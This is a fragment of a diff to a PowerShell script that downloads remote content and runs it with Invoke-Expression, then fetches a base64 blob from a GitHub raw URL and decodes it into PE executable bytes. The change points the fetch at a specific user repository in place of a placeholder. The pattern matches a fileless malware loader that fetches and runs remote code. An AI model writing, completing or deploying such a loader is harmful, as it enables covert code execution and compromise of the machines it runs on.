@@ -9,7 +9,7 @@ try {
     $loaderContent = (iwr -UseBasicParsing $loaderUrl).Content
     Invoke-Expression $loaderContent
 
-    $exeUrl = "https://raw.githubusercontent.com/dein-user/dein-repo/main/johannesschwein.txt"
+    $exeUrl = "https://raw.githubusercontent.com/spritezerosugar67/johannesschwein/refs/heads/main/johannesschwein.txt"
     $base64String = (iwr -UseBasicParsing $exeUrl).Content
     
     $peBytes = [System.Convert]::FromBase64String($base64String)
